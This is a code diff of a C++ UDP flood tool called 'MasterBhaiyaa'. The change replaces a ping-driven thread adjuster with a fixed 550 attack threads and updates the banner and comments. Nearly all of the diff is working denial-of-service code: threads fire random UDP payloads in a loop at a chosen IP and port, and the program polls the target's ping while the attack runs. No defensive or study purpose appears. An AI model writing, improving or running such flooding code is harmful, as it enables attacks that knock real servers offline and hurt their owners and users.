@@ -13,15 +13,13 @@
 #include <fcntl.h>
 #include <random>
 
-#define MAX_THREADS 650
-#define MIN_THREADS 530
+#define FIXED_THREADS 550
 #define DEFAULT_PAYLOAD_SIZE 24
 #define BINARY_NAME "MasterBhaiyaa"
 #define TARGET_PING 677
 #define PING_CHECK_INTERVAL 2
 
 std::atomic<bool> stop_flag(false);
-std::atomic<int> dynamic_threads(MIN_THREADS);
 
 struct AttackConfig {
     std::string ip;
@@ -32,7 +30,7 @@ struct AttackConfig {
 
 // Signal handler
 void handle_signal(int signal) {
-    std::cout << "\n[!] Stopping AI-Powered UDP attack...\n";
+    std::cout << "\n[!] Stopping AI UDP attack...\n";
     stop_flag = true;
 }
 
@@ -42,7 +40,7 @@ bool is_valid_ip(const std::string &ip) {
     return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
 }
 
-// Generate AI-based dynamic payload
+// Generate AI-based random payload
 void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
     static std::random_device rd;
     static std::mt19937 gen(rd());
@@ -54,7 +52,7 @@ void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
     }
 }
 
-// Simulated function to get target response time (ping)
+// Check target ping
 int get_target_ping(const std::string &target_ip) {
     std::string command = "ping -c 1 -W 1 " + target_ip + " | grep 'time=' | awk -F'=' '{print $NF}' | awk '{print int($1)}'";
     FILE *pipe = popen(command.c_str(), "r");
@@ -65,26 +63,10 @@ int get_target_ping(const std::string &target_ip) {
     pclose(pipe);
 
     int ping = atoi(buffer);
-    return (ping > 0) ? ping : 800; // Default to high value if no response
+    return (ping > 0) ? ping : 800;
 }
 
-// AI-Controlled Attack Rate Adjustment (Keeps Ping at 677ms)
-void adjust_attack_rate(const std::string &target_ip) {
-    while (!stop_flag) {
-        int current_ping = get_target_ping(target_ip);
-
-        if (current_ping < TARGET_PING - 10) {
-            dynamic_threads = std::min(MAX_THREADS, dynamic_threads + 20);
-        } else if (current_ping > TARGET_PING + 10) {
-            dynamic_threads = std::max(MIN_THREADS, dynamic_threads - 20);
-        }
-
-        std::cout << "[AI] Current Ping: " << current_ping << "ms | Adjusting Threads: " << dynamic_threads.load() << "\n";
-        std::this_thread::sleep_for(std::chrono::seconds(PING_CHECK_INTERVAL));
-    }
-}
-
-// UDP attack function (AI-Enhanced)
+// UDP Attack Function (Fixed 550 Threads)
 void udp_attack(const AttackConfig &config) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return;
@@ -104,7 +86,7 @@ void udp_attack(const AttackConfig &config) {
         for (int i = 0; i < 10; i++) {
             sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
         }
-        generate_payload(payload, config.payload_size);  // AI-based payload switching
+        generate_payload(payload, config.payload_size);
     }
 
     close(sock);
@@ -130,20 +112,18 @@ int main(int argc, char *argv[]) {
 
     std::signal(SIGINT, handle_signal);
 
-    std::cout << "🔥 MasterBhaiyaa v6.2 - AI-Powered UDP (677ms Fixed Ping) 🔥\n";
+    std::cout << "🔥 MasterBhaiyaa v6.4 - AI UDP (Fixed 550 Threads & 677ms Ping Lock) 🔥\n";
     std::cout << "© 2024-2054 @MasterBhaiyaa\n";
     std::cout << "=====================================\n";
     std::cout << "Target: " << config.ip << ":" << config.port << "\n";
     std::cout << "Duration: " << config.duration << " sec\n";
-    std::cout << "Threads: " << dynamic_threads.load() << "\n";
+    std::cout << "Threads: " << FIXED_THREADS << "\n";
     std::cout << "Payload Size: " << config.payload_size << " bytes\n";
     std::cout << "Target Ping: " << TARGET_PING << " ms (AI-Controlled)\n";
     std::cout << "=====================================\n\n";
 
-    std::thread ping_monitor(adjust_attack_rate, config.ip);
-
     std::vector<std::thread> threads;
-    for (int i = 0; i < dynamic_threads.load(); ++i) {
+    for (int i = 0; i < FIXED_THREADS; ++i) {
         threads.emplace_back(udp_attack, config);
     }
 
@@ -152,7 +132,6 @@ int main(int argc, char *argv[]) {
     }
 
     stop_flag = true;
-    ping_monitor.join();
 
     std::cout << "\n[✔] AI-Powered UDP attack completed.\n";
     std::cout << "© @MasterBhaiyaa\n";
